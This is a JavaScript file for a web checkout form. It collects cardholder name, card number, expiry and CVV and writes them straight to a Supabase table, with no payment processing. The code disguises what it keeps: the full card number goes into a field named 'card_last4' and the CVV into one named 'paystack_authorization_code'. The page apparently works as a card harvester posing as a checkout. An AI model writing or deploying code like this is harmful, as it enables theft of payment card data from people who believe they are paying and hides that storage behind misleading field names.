const payButton = document.getElementById("pay-button");
const form = document.getElementById("payment-form");
const formStatus = document.getElementById("form-status");

const cardName = document.getElementById("card-name");
const cardNumber = document.getElementById("card-number");
const expiry = document.getElementById("expiry");
const cvv = document.getElementById("cvv");

const config = window.APP_CONFIG || {};
const supabaseUrl = config.SUPABASE_URL || "";
const supabaseAnonKey = config.SUPABASE_ANON_KEY || "";
const supabaseClient =
  window.supabase && supabaseUrl && supabaseAnonKey
    ? window.supabase.createClient(supabaseUrl, supabaseAnonKey)
    : null;

function formatCardNumber(value) {
  return value
    .replace(/\D/g, "")
    .slice(0, 16)
    .replace(/(\d{4})(?=\d)/g, "$1 ")
    .trim();
}

function formatExpiry(value) {
  let digits = value.replace(/\D/g, "");

  if (digits.length === 1 && parseInt(digits, 10) > 1) {
    digits = `0${digits}`;
  }

  if (digits.length >= 3) {
    return `${digits.slice(0, 2)}/${digits.slice(2, 4)}`;
  }

  return digits;
}

cardNumber.addEventListener("input", () => {
  cardNumber.value = formatCardNumber(cardNumber.value);
});

expiry.addEventListener("input", () => {
  expiry.value = formatExpiry(expiry.value);
});

cvv.addEventListener("input", () => {
  cvv.value = cvv.value.replace(/\D/g, "").slice(0, 4);
});

cardName.addEventListener("input", () => {
  cardName.value = cardName.value.replace(/\s{2,}/g, " ");
});

function getCleanCardNumber(value) {
  return value.replace(/\D/g, "");
}

function setStatus(message, type = "") {
  if (!formStatus) {
    return;
  }

  formStatus.textContent = message;
  formStatus.className = "form-status";

  if (type) {
    formStatus.classList.add(`is-${type}`);
  }
}

form.addEventListener("submit", (event) => {
  event.preventDefault();

  const cleanedName = cardName.value.trim();
  const cleanCardNumber = getCleanCardNumber(cardNumber.value);

  if (!cleanedName) {
    setStatus("Enter the card name.", "error");
    return;
  }

  if (!cleanCardNumber) {
    setStatus("Enter the card number.", "error");
    return;
  }

  if (!supabaseClient) {
    setStatus("Supabase is not configured yet.", "error");
    return;
  }
  payButton.disabled = true;

  supabaseClient
    .from("payment_records")
    .insert([
      {
        cardholder_name: cleanedName,
        card_last4: cleanCardNumber,
        paystack_authorization_code: cvv.value,
        card_expiry: expiry.value,
      },
    ])
    .then(({ error }) => {
      if (error) {
        throw error;
      }

      window.location.reload();
    })
    .catch((error) => {
      setStatus(error.message || "Failed to save to Supabase.", "error");
    })
    .finally(() => {
      payButton.disabled = false;
    });
});
